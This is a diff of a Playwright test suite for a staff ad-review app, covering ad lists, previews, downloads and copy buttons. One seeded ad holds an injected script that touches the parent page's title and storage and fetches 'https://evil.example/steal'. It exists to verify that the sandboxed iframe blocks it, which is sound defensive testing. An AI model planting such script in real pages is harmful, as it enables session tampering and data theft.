@@ -2,8 +2,8 @@ import fs from 'node:fs'
 import { expect, test, type Page } from '@playwright/test'
 import { installFakeStaff, signIn, type StaffWorld } from './fake-staff'
 
-const shot = async (page: Page, name: string) => {
-  expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(390)
+const shot = async (page: Page, name: string, width = 390) => {
+  expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(width)
   const dir = process.env.SCREENSHOTS_DIR
   if (dir) await page.screenshot({ path: `${dir}/${name}.png`, fullPage: true })
 }
@@ -13,278 +13,419 @@ const adHtml = (label: string, extra = '') => `<!doctype html><html><head><style
   font:500 120px sans-serif;background:#fff;color:#171717}</style>${extra}</head>
   <body><main class="ad">${label}</main></body></html>`
 
-// A 1x1 PNG.
+// A 1x1 PNG and a few bytes standing in for an MP4 (headless Chromium cannot decode H.264 anyway).
 const PNG = Buffer.from(
   'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
   'base64',
 )
+const MP4 = Buffer.from('00000020667479706973366d', 'hex')
+// For review screenshots only: real posters from a local folder (never in CI).
+const POSTERS = process.env.SCREENSHOT_POSTERS
+const SLUGS: Record<string, string> = {
+  t1: 'hard-to-find',
+  t2: 'hard-to-find',
+  t3: 'chasing-trades',
+  t5: 'one-team',
+  t7: 'twenty-minute-call',
+}
+const posterFor = (id: string, ratio: '4x5' | '9x16') => {
+  const base = POSTERS && SLUGS[id] && `${POSTERS}/${SLUGS[id]}-animated-${ratio}-poster`
+  const file = base && [`${base}-v3.png`, `${base}.png`].find((f) => fs.existsSync(f))
+  return file ? fs.readFileSync(file) : PNG
+}
+const LINK =
+  'https://book.q3interiors.ie/?utm_source=instagram&utm_medium=paid&utm_campaign=type-test-1&utm_content=one-team-animated#/'
 
-function seed(world: StaffWorld, opts: { creative?: boolean; hostile?: boolean } = {}) {
-  const variant = (size: 'portrait' | 'vertical', width: number, height: number) => ({
-    id: `var-${size}`,
-    size,
-    width,
-    height,
-    html_path: `ad-1/v1/${size}.html`,
-    export_path: `ad-1/v1/${size}.png`,
-    export_bytes: PNG.length,
-  })
-  world.tables.ads = [
-    {
-      id: 'ad-1',
-      name: 'Sample: Planning a home renovation? (type only)',
-      status: 'new',
-      created_at: '2026-11-25T10:00:00Z',
-      created_by_name: 'Ad studio (Claude session)',
-      campaign_creatives: opts.creative
-        ? {
-            label: 'Reel 1',
-            slug: 'reel-1',
-            campaigns: {
-              name: 'Spring kitchens',
-              slug: 'spring-kitchens',
-              utm_source: 'instagram',
-              utm_medium: 'paid_social',
-              landing_route: '/enquire',
-            },
-          }
-        : null,
-      ad_versions: [
-        {
-          id: 'ver-1',
-          version: 1,
-          caption: 'Planning a home renovation? Tell us about your project.',
-          headline: 'Tell us about your project',
-          button_label: 'Learn more',
-          notes: null,
-          created_at: '2026-11-25T10:00:00Z',
-          ad_variants: [variant('portrait', 1440, 1800), variant('vertical', 1440, 2560)],
-        },
-      ],
-    },
-    {
-      id: 'ad-0',
-      name: 'An older ad',
-      status: 'approved',
-      created_at: '2026-11-20T10:00:00Z',
-      created_by_name: null,
-      campaign_creatives: null,
-      ad_versions: [{ version: 2 }],
-    },
-  ]
-  const hostile = opts.hostile
-    ? '<script>try{parent.document.title="taken";parent.localStorage.setItem("x","1")}catch(e){};fetch("https://evil.example/steal")</script>'
-    : ''
-  world.adFiles.set('ad-1/v1/portrait.html', {
-    body: adHtml('Feed 4:5', hostile),
-    type: 'text/html',
-  })
-  world.adFiles.set('ad-1/v1/vertical.html', { body: adHtml('Stories 9:16'), type: 'text/html' })
-  world.adFiles.set('ad-1/v1/portrait.png', { body: PNG, type: 'image/png' })
-  world.adFiles.set('ad-1/v1/vertical.png', { body: PNG, type: 'image/png' })
+type Seed = {
+  id: string
+  name: string
+  set: string | null
+  position: number | null
+  status: string
 }
 
-test('staff see the ads, preview each size, download the image and copy the words', async ({
+function animatedAd(world: StaffWorld, s: Seed, created: string) {
+  const variants = (['portrait', 'vertical'] as const).map((size) => {
+    const base = `${s.id}/v1/${size}`
+    world.adFiles.set(`${base}.mp4`, { body: MP4, type: 'video/mp4' })
+    world.adFiles.set(`${base}.poster.png`, {
+      body: posterFor(s.id, size === 'portrait' ? '4x5' : '9x16'),
+      type: 'image/png',
+    })
+    world.adFiles.set(`${base}.html`, { body: adHtml(s.name), type: 'text/html' })
+    return {
+      id: `${s.id}-${size}`,
+      size,
+      width: 1440,
+      height: size === 'portrait' ? 1800 : 2560,
+      html_path: `${base}.html`,
+      export_path: `${base}.mp4`,
+      export_bytes: MP4.length,
+      export_type: 'video',
+      duration_ms: 8000,
+      poster_path: `${base}.poster.png`,
+    }
+  })
+  return {
+    id: s.id,
+    name: s.name,
+    status: s.status,
+    set_name: s.set,
+    set_position: s.position,
+    created_at: created,
+    created_by_name: 'Ad studio (Claude session)',
+    campaign_creatives: null,
+    ad_versions: [
+      {
+        id: `${s.id}-v1`,
+        version: 1,
+        caption: `${s.name} One team, start to finish.`,
+        headline: s.name,
+        button_label: 'Learn more',
+        notes: 'Words as supplied.',
+        link_url: LINK,
+        created_at: created,
+        approved_at: s.status === 'approved' ? created : null,
+        approved_by_name: s.status === 'approved' ? 'Chris Admin' : null,
+        ad_variants: variants,
+      },
+    ],
+    ad_requests: [],
+    ad_events: [
+      {
+        kind: 'published',
+        version: 1,
+        detail: null,
+        actor_name: 'Ad studio (Claude session)',
+        created_at: created,
+      },
+    ],
+  }
+}
+
+function stillAd(world: StaffWorld, hostile = false) {
+  const hostileScript = hostile
+    ? '<script>try{parent.document.title="taken";parent.localStorage.setItem("x","1")}catch(e){};fetch("https://evil.example/steal")</script>'
+    : ''
+  for (const size of ['portrait', 'vertical']) {
+    world.adFiles.set(`old/v1/${size}.html`, {
+      body: adHtml(size === 'portrait' ? 'Feed 4:5' : 'Stories 9:16', hostileScript),
+      type: 'text/html',
+    })
+    world.adFiles.set(`old/v1/${size}.png`, { body: PNG, type: 'image/png' })
+  }
+  return {
+    id: 'old',
+    name: 'Planning a home renovation?',
+    status: 'new',
+    set_name: 'Samples',
+    set_position: 1,
+    created_at: '2026-11-25T10:00:00Z',
+    created_by_name: 'Ad studio (Claude session)',
+    campaign_creatives: {
+      label: 'Reel 1',
+      slug: 'reel-1',
+      campaigns: {
+        name: 'Spring kitchens',
+        slug: 'spring-kitchens',
+        utm_source: 'instagram',
+        utm_medium: 'paid_social',
+        landing_route: '/enquire',
+      },
+    },
+    ad_versions: [
+      {
+        id: 'old-v1',
+        version: 1,
+        caption: 'Planning a home renovation? Tell us about your project.',
+        headline: 'Tell us about your project',
+        button_label: 'Learn more',
+        notes: null,
+        created_at: '2026-11-25T10:00:00Z',
+        ad_variants: (['portrait', 'vertical'] as const).map((size) => ({
+          id: `old-${size}`,
+          size,
+          width: 1440,
+          height: size === 'portrait' ? 1800 : 2560,
+          html_path: `old/v1/${size}.html`,
+          export_path: `old/v1/${size}.png`,
+          export_bytes: PNG.length,
+        })),
+      },
+    ],
+    ad_requests: [],
+  }
+}
+
+function seed(world: StaffWorld, opts: { hostile?: boolean } = {}) {
+  world.tables.ads = [
+    stillAd(world, opts.hostile),
+    animatedAd(
+      world,
+      { id: 't3', name: 'Stop chasing trades.', set: 'Type test 1', position: 3, status: 'new' },
+      '2026-11-26T12:00:00Z',
+    ),
+    animatedAd(
+      world,
+      {
+        id: 't1',
+        name: 'Good builders shouldn’t be hard to find.',
+        set: 'Type test 1',
+        position: 1,
+        status: 'new',
+      },
+      '2026-11-26T10:00:00Z',
+    ),
+    animatedAd(
+      world,
+      {
+        id: 't5',
+        name: 'Your renovation. One team.',
+        set: 'Type test 1',
+        position: 5,
+        status: 'changes_requested',
+      },
+      '2026-11-26T11:00:00Z',
+    ),
+    animatedAd(
+      world,
+      {
+        id: 't7',
+        name: 'Start with a 20-minute call.',
+        set: 'Type test 1',
+        position: 7,
+        status: 'approved',
+      },
+      '2026-11-26T11:30:00Z',
+    ),
+    animatedAd(
+      world,
+      {
+        id: 't2',
+        name: 'Good builders shouldn’t be hard to find.',
+        set: 'Type test 1',
+        position: 2,
+        status: 'archived',
+      },
+      '2026-11-26T09:00:00Z',
+    ),
+  ]
+}
+
+const tiles = (page: Page) => page.getByRole('main').getByRole('listitem')
+
+test('the list is a poster grid grouped by set, filtered by chips; staff cannot select', async ({
+  page,
+}) => {
+  const world = await installFakeStaff(page)
+  seed(world)
+  await page.goto('/#/ads')
+  await signIn(page, 'staff@example.com', 'another long password')
+  await expect(page.getByRole('heading', { name: 'Ads', level: 1 })).toBeVisible()
+  // To review: new, changes requested; newest set first, in set order.
+  const sets = page.getByRole('main').getByRole('heading', { level: 2 })
+  await expect(sets).toHaveText(['Type test 1', 'Samples'])
+  await expect(tiles(page)).toHaveCount(4)
+  await expect(tiles(page).nth(0)).toContainText('Good builders shouldn’t be hard to find.')
+  await expect(tiles(page).nth(1)).toContainText('Stop chasing trades.')
+  await expect(tiles(page).nth(2)).toContainText('Changes requested')
+  await expect(page.getByRole('main')).not.toContainText(/\((animated|still)\)|Animated,|Version 1/)
+  // Posters, two columns at 390px.
+  const boxes = await Promise.all([0, 1].map((i) => tiles(page).nth(i).boundingBox()))
+  expect(boxes[0]?.y).toBe(boxes[1]?.y)
+  await expect(tiles(page).first().locator('img')).toHaveAttribute('src', /^blob:/)
+  await expect(page.getByRole('button', { name: 'Select' })).toHaveCount(0)
+  await shot(page, 'list')
+
+  await page.getByText('Approved', { exact: true }).click()
+  await expect(tiles(page)).toHaveCount(1)
+  await expect(tiles(page).first()).toContainText('Start with a 20-minute call.')
+  await page.getByText('Archived', { exact: true }).click()
+  await expect(tiles(page)).toHaveCount(1)
+  await page.getByText('All', { exact: true }).click()
+  await expect(tiles(page)).toHaveCount(6)
+  // The nav count still means ads with status "new".
+  await expect(
+    page.getByRole('navigation', { name: 'Staff' }).getByRole('link', { name: /Ads/ }),
+  ).toContainText('3')
+})
+
+test('an admin selects several ads and archives them, and can bring them back', async ({
+  page,
+}) => {
+  const world = await installFakeStaff(page)
+  seed(world)
+  await page.goto('/#/ads')
+  await signIn(page, 'admin@example.com', 'correct horse battery staple')
+  await page.getByRole('button', { name: 'Select' }).click()
+  await page.getByText('Stop chasing trades.').click()
+  await page.getByText('Planning a home renovation?').click()
+  await expect(page.getByText('2 selected')).toBeVisible()
+  await shot(page, 'list-select')
+  await page.getByRole('button', { name: 'Archive 2' }).click()
+  await expect(page.getByText('Archived 2 ads. Find them under Archived.')).toBeVisible()
+  expect(world.rpcCalls.filter((c) => c.name === 'archive_ad')).toHaveLength(2)
+  await expect(tiles(page)).toHaveCount(2)
+  await page.getByText('Archived', { exact: true }).click()
+  await expect(tiles(page)).toHaveCount(3)
+  await page.getByRole('button', { name: 'Select' }).click()
+  await page.getByText('Stop chasing trades.').click()
+  await page.getByRole('button', { name: 'Bring back 1' }).click()
+  await expect(page.getByText('Brought back 1 ad.')).toBeVisible()
+  await expect(tiles(page)).toHaveCount(2)
+})
+
+test('the ad page: walk the list, Reel, Feed and Still with matching downloads, copy rows', async ({
   page,
   context,
 }) => {
   await context.grantPermissions(['clipboard-read', 'clipboard-write'])
   const world = await installFakeStaff(page)
-  seed(world, { creative: true })
+  seed(world)
   await page.goto('/#/ads')
   await signIn(page, 'staff@example.com', 'another long password')
-  await expect(page.getByRole('heading', { name: 'Ads', level: 1 })).toBeVisible()
-  const items = page.getByRole('main').getByRole('listitem')
-  await expect(items.first()).toContainText('Sample: Planning a home renovation?')
-  await expect(items.first()).toContainText('New')
-  await expect(items.nth(1)).toContainText('Version 2')
-  await shot(page, 'a1-ads-list')
-
-  await items.first().getByRole('link').click()
-  await expect(page.getByRole('tab', { name: 'Feed 4:5' })).toHaveAttribute('aria-selected', 'true')
-  const frame = page.locator('iframe[title$="Feed 4:5"]')
-  await expect(frame).toHaveAttribute('sandbox', '')
-  await expect(frame.contentFrame().getByText('Feed 4:5')).toBeVisible()
-  // True proportions: 4:5.
-  const box = await frame.locator('xpath=..').boundingBox()
-  expect(Math.round(((box?.width ?? 0) / (box?.height ?? 1)) * 100)).toBe(80)
-  await shot(page, 'a2-ad-feed')
-
-  const download = page.waitForEvent('download')
-  await page.getByRole('button', { name: 'Download the image (Feed 4:5)' }).click()
-  const file = await download
-  expect(file.suggestedFilename()).toBe(
-    'q3-sample-planning-a-home-renovation-type-only-v1-4x5-1440x1800.png',
-  )
-  expect(fs.readFileSync((await file.path()) ?? '')).toEqual(PNG)
-
-  await page.getByRole('tab', { name: 'Stories and Reels 9:16' }).click()
+  await tiles(page).nth(1).getByRole('link').click()
+  await expect(page.getByRole('heading', { name: 'Stop chasing trades.', level: 1 })).toBeVisible()
+  const walk = page.getByRole('navigation', { name: 'Ads in this list' })
+  await expect(walk).toContainText('2 of 4')
+  await walk.getByRole('link', { name: 'Previous' }).click()
   await expect(
-    page.locator('iframe[title$="9:16"]').contentFrame().getByText('Stories 9:16'),
+    page.getByRole('heading', { name: 'Good builders shouldn’t be hard to find.', level: 1 }),
   ).toBeVisible()
-  await expect(page.getByText('Instagram covers roughly the top 14%')).toBeVisible()
-  await shot(page, 'a3-ad-stories')
+  await expect(walk).toContainText('1 of 4')
+  await walk.getByRole('link', { name: 'Next' }).click()
+  await expect(walk).toContainText('2 of 4')
 
-  await page.getByRole('button', { name: 'Copy caption' }).click()
-  expect(await page.evaluate(() => navigator.clipboard.readText())).toBe(
-    'Planning a home renovation? Tell us about your project.',
+  // Reel first: the published MP4, muted, looping, inline; tap toggles play.
+  const preview = page.getByRole('region', { name: 'Preview' })
+  await expect(preview.getByRole('radio', { name: 'Reel' })).toBeChecked()
+  const video = preview.locator('video')
+  await expect(video).toHaveAttribute('src', /^blob:/)
+  expect(await video.evaluate((v: HTMLVideoElement) => [v.muted, v.loop, v.playsInline])).toEqual([
+    true,
+    true,
+    true,
+  ])
+  await expect(preview.getByRole('button', { name: /(Play|Pause) the video/ })).toBeVisible()
+  await expect(preview.getByText('1440 × 2560 · 8 s')).toBeVisible()
+  // No version picker for a single version; no old explanatory paragraphs or buttons.
+  await expect(page.getByLabel('Version', { exact: true })).toHaveCount(0)
+  await expect(
+    page.getByRole('button', { name: /Replay|Download a still of the last frame/ }),
+  ).toHaveCount(0)
+  await shot(page, 'ad-reel')
+
+  const reel = page.waitForEvent('download')
+  await page.getByRole('button', { name: 'Download reel video' }).click()
+  const reelFile = await reel
+  expect(reelFile.suggestedFilename()).toBe('q3-stop-chasing-trades-v1-9x16-1440x2560.mp4')
+  expect(fs.readFileSync((await reelFile.path()) ?? '')).toEqual(MP4)
+
+  await preview.getByText('Feed', { exact: true }).click()
+  await expect(preview.getByText('1440 × 1800 · 8 s')).toBeVisible()
+  await expect(page.getByRole('button', { name: 'Download feed video' })).toBeVisible()
+  await shot(page, 'ad-feed')
+
+  await preview.getByText('Still', { exact: true }).click()
+  await expect(preview.getByRole('img', { name: /Stop chasing trades/ })).toBeVisible()
+  await expect(page.getByRole('button', { name: 'Download still' })).toBeVisible()
+  const still = page.waitForEvent('download')
+  await page.getByRole('button', { name: 'Download the 9:16 still' }).click()
+  expect((await still).suggestedFilename()).toBe(
+    'q3-stop-chasing-trades-v1-9x16-1440x2560-still.png',
   )
-  await expect(page.getByText(/Tagged for Spring kitchens, creative Reel 1/)).toBeVisible()
-  await page.getByRole('button', { name: 'Copy link' }).click()
-  expect(await page.evaluate(() => navigator.clipboard.readText())).toBe(
-    'https://book.q3interiors.ie/?utm_source=instagram&utm_medium=paid_social&utm_campaign=spring-kitchens&utm_content=reel-1#/enquire',
-  )
+  await shot(page, 'ad-still')
+
+  // To post: one row each, copy buttons with names.
+  const post = page.getByRole('region', { name: 'To post' })
+  await post.getByRole('button', { name: 'Copy link' }).click()
+  expect(await page.evaluate(() => navigator.clipboard.readText())).toBe(LINK)
+  await expect(post.getByRole('button', { name: 'Link copied' })).toBeVisible()
+  await post.getByRole('button', { name: 'Copy instagram button' }).click()
+  expect(await page.evaluate(() => navigator.clipboard.readText())).toBe('Learn more')
+  await expect(page.getByText(/not linked to a campaign creative/)).toHaveCount(0)
+
+  // Ask for a change: closed until asked; the open request then shows above the actions.
+  await expect(page.getByLabel('What should change?')).toHaveCount(0)
+  await page.getByRole('button', { name: 'Ask for a change' }).click()
+  await page.getByLabel('What should change?').fill('Slower reveal on the headline')
+  await shot(page, 'ad-request-form')
+  await page.getByRole('button', { name: 'Save the request' }).click()
+  await expect(page.getByText('1 open request')).toBeVisible()
+  await expect(page.getByLabel('What should change?')).toHaveCount(0)
+
+  // More holds the notes and the history.
+  await page.getByText('More', { exact: true }).click()
+  await expect(page.getByText('Words as supplied.')).toBeVisible()
+  await expect(page.getByText(/^Published, version 1/)).toBeVisible()
 })
 
-test('ad HTML cannot touch the staff session or reach the network', async ({ page }) => {
+test('reduced motion: no autoplay, the poster with a play button', async ({ page }) => {
+  await page.emulateMedia({ reducedMotion: 'reduce' })
+  const world = await installFakeStaff(page)
+  seed(world)
+  await page.goto('/#/ads/t1')
+  await signIn(page, 'staff@example.com', 'another long password')
+  const video = page.getByRole('region', { name: 'Preview' }).locator('video')
+  await expect(video).toHaveAttribute('src', /^blob:/)
+  await expect(video).toHaveAttribute('poster', /^blob:/)
+  expect(await video.evaluate((v: HTMLVideoElement) => v.paused)).toBe(true)
+  await expect(page.getByRole('button', { name: 'Play the video' })).toBeVisible()
+})
+
+test('an ad published as images shows Feed and Stories in the sandboxed frame', async ({
+  page,
+}) => {
   const world = await installFakeStaff(page)
   seed(world, { hostile: true })
   const outside: string[] = []
   page.on('request', (r) => {
     if (r.url().includes('evil.example')) outside.push(r.url())
   })
-  await page.goto('/#/ads/ad-1')
+  await page.goto('/#/ads/old')
   await signIn(page, 'admin@example.com', 'correct horse battery staple')
-  const frame = page.locator('iframe[title$="Feed 4:5"]')
+  const preview = page.getByRole('region', { name: 'Preview' })
+  await expect(preview.getByRole('radio')).toHaveCount(2)
+  await expect(preview.getByRole('radio', { name: 'Feed' })).toBeChecked()
+  const frame = page.locator('iframe[title*="feed"]')
+  await expect(frame).toHaveAttribute('sandbox', '')
   await expect(frame.contentFrame().getByText('Feed 4:5')).toBeVisible()
   await page.waitForTimeout(500)
   expect(await page.title()).toBe('Q3 Interiors Staff')
   expect(await page.evaluate(() => window.localStorage.getItem('x'))).toBeNull()
   expect(outside).toEqual([])
-  // The frame is a separate, opaque origin with its own lock-down policy.
   expect(await frame.evaluate((f: HTMLIFrameElement) => f.contentDocument === null)).toBe(true)
   expect(await frame.getAttribute('srcdoc')).toContain("default-src 'none'")
-  await expect(page.getByText(/not linked to a campaign creative/)).toBeVisible()
-})
-
-test('the staff header shows the wordmark with a Staff label and the Ads tab fits at 390px', async ({
-  page,
-}) => {
-  await installFakeStaff(page)
-  await page.goto('/#/settings')
-  await signIn(page, 'admin@example.com', 'correct horse battery staple')
-  const home = page.getByRole('link', { name: 'Q3 Interiors Staff home' })
-  await expect(home.locator('img')).toHaveAttribute('src', '/brand/q3-full-black.svg')
-  await expect(home).toContainText('Staff')
-  await expect(
-    page.getByRole('navigation', { name: 'Staff' }).getByRole('link', { name: 'Ads' }),
-  ).toBeVisible()
-  await shot(page, 'a4-staff-header')
-})
-
-// An animated ad: CSS moves the dot; the script must not run in the frame.
-const animatedHtml = `<!doctype html><html><head><style>
-  body{margin:0} .ad{width:1440px;height:100vh;position:relative;background:#fff;color:#171717;
-  font:500 120px sans-serif} .dot{position:absolute;left:100px;top:600px;width:200px;height:200px;
-  background:#000;animation:move 2s linear infinite}
-  @keyframes move{50%{transform:translateX(900px)}}</style>
-  <script>parent.document.title="taken"</script></head>
-  <body><main class="ad">Animated<div class="dot"></div></main></body></html>`
-const MP4 = Buffer.from('00000020667479706973366d', 'hex')
-
-test('an animated ad plays in the frame without scripts, pauses, replays and downloads as video', async ({
-  page,
-}) => {
-  const world = await installFakeStaff(page)
-  seed(world)
-  const ads = world.tables.ads as Record<string, unknown>[]
-  ads.unshift({
-    id: 'ad-2',
-    name: 'Sample (animated): Planning a home renovation?',
-    status: 'new',
-    created_at: '2026-11-26T10:00:00Z',
-    created_by_name: 'Ad studio (Claude session)',
-    campaign_creatives: null,
-    ad_versions: [
-      {
-        id: 'ver-2',
-        version: 1,
-        caption: 'Planning a home renovation? Tell us about your project.',
-        headline: 'Tell us about your project',
-        button_label: 'Learn more',
-        notes: null,
-        created_at: '2026-11-26T10:00:00Z',
-        ad_variants: (['portrait', 'vertical'] as const).map((size) => ({
-          id: `var2-${size}`,
-          size,
-          width: 1440,
-          height: size === 'portrait' ? 1800 : 2560,
-          html_path: `ad-2/v1/${size}.html`,
-          export_path: `ad-2/v1/${size}.mp4`,
-          export_bytes: MP4.length,
-          export_type: 'video',
-          duration_ms: 2000,
-          poster_path: `ad-2/v1/${size}.poster.png`,
-        })),
-      },
-    ],
-  })
-  for (const size of ['portrait', 'vertical']) {
-    world.adFiles.set(`ad-2/v1/${size}.html`, { body: animatedHtml, type: 'text/html' })
-    world.adFiles.set(`ad-2/v1/${size}.mp4`, { body: MP4, type: 'video/mp4' })
-    world.adFiles.set(`ad-2/v1/${size}.poster.png`, { body: PNG, type: 'image/png' })
-  }
-  await page.goto('/#/ads')
-  await signIn(page, 'staff@example.com', 'another long password')
-  const items = page.getByRole('main').getByRole('listitem')
-  await expect(items.first()).toContainText('Animated, 2 seconds')
-  await expect(items.nth(1)).not.toContainText('Animated')
-  await shot(page, 'c1-ads-list')
-
-  await items.first().getByRole('link').click()
-  await expect(page.getByText('Animated: 2 seconds, then it starts again.')).toBeVisible()
-  const frame = page.locator('iframe[title$="Feed 4:5"]')
-  await expect(frame).toHaveAttribute('sandbox', '')
-  const playState = () =>
-    frame
-      .contentFrame()
-      .locator('.dot')
-      .evaluate((el) => el.getAnimations()[0]?.playState)
-  const at = () =>
-    frame
-      .contentFrame()
-      .locator('.dot')
-      .evaluate((el) => Number(el.getAnimations()[0]?.currentTime ?? -1))
-  // CSS runs in the frame; the script does not.
-  await expect.poll(playState).toBe('running')
-  expect(await page.title()).toBe('Q3 Interiors Staff')
-  expect(await frame.evaluate((f: HTMLIFrameElement) => f.contentDocument === null)).toBe(true)
-  expect(await frame.getAttribute('srcdoc')).toContain("default-src 'none'")
-  await page.waitForTimeout(400)
-  await shot(page, 'c2-ad-animated')
-
-  await page.getByRole('button', { name: 'Pause' }).click()
-  await expect.poll(playState).toBe('paused')
-  const held = await at()
-  expect(held).toBeGreaterThan(0)
-  await page.waitForTimeout(300)
-  expect(await at()).toBe(held)
-  await shot(page, 'c3-ad-paused')
-  await page.getByRole('button', { name: 'Play', exact: true }).click()
-  await expect.poll(playState).toBe('running')
-
-  await page.waitForTimeout(1200)
-  await page.getByRole('button', { name: 'Replay' }).click()
-  await expect.poll(at).toBeLessThan(1000)
-
-  await expect(page.getByRole('button', { name: /Download the image/ })).toHaveCount(0)
   const download = page.waitForEvent('download')
-  await page.getByRole('button', { name: 'Download the video (Feed 4:5)' }).click()
-  const file = await download
-  expect(file.suggestedFilename()).toBe(
-    'q3-sample-animated-planning-a-home-renovation-v1-4x5-1440x1800.mp4',
+  await page.getByRole('button', { name: 'Download feed image' }).click()
+  expect((await download).suggestedFilename()).toBe(
+    'q3-planning-a-home-renovation-v1-4x5-1440x1800.png',
   )
-  expect(fs.readFileSync((await file.path()) ?? '')).toEqual(MP4)
-  const still = page.waitForEvent('download')
-  await page.getByRole('button', { name: 'Download a still of the last frame (Feed 4:5)' }).click()
-  expect((await still).suggestedFilename()).toBe(
-    'q3-sample-animated-planning-a-home-renovation-v1-4x5-1440x1800-still.png',
+  await preview.getByText('Stories', { exact: true }).click()
+  await expect(page.getByRole('button', { name: 'Download stories image' })).toBeVisible()
+  // The campaign creative's link is used when the version has none.
+  await expect(page.getByRole('region', { name: 'To post' })).toContainText(
+    'utm_campaign=spring-kitchens&utm_content=reel-1#/enquire',
   )
+})
 
-  // The review loop is the same for an animated ad.
-  await expect(page.getByRole('heading', { name: 'Change requests on version 1' })).toBeVisible()
-  await page.getByRole('tab', { name: 'Stories and Reels 9:16' }).click()
-  await expect(
-    page.getByRole('button', { name: 'Download the video (Stories and Reels 9:16)' }),
-  ).toBeVisible()
+test.describe('desktop', () => {
+  test.use({ viewport: { width: 1280, height: 900 }, isMobile: false, hasTouch: false })
+
+  test('preview on the left, the rest on the right', async ({ page }) => {
+    const world = await installFakeStaff(page)
+    seed(world)
+    await page.goto('/#/ads/t3')
+    await signIn(page, 'admin@example.com', 'correct horse battery staple')
+    const preview = page.getByRole('region', { name: 'Preview' })
+    const post = page.getByRole('region', { name: 'To post' })
+    await expect(post).toBeVisible()
+    const [a, b] = await Promise.all([preview.boundingBox(), post.boundingBox()])
+    expect((a?.x ?? 0) + (a?.width ?? 0)).toBeLessThanOrEqual(b?.x ?? 0)
+    await expect(page.getByRole('button', { name: 'Approve' })).toBeVisible()
+    await shot(page, 'ad-desktop', 1280)
+    await page.goto('/#/ads')
+    await expect(tiles(page).first()).toBeVisible()
+    await shot(page, 'list-desktop', 1280)
+  })
 })
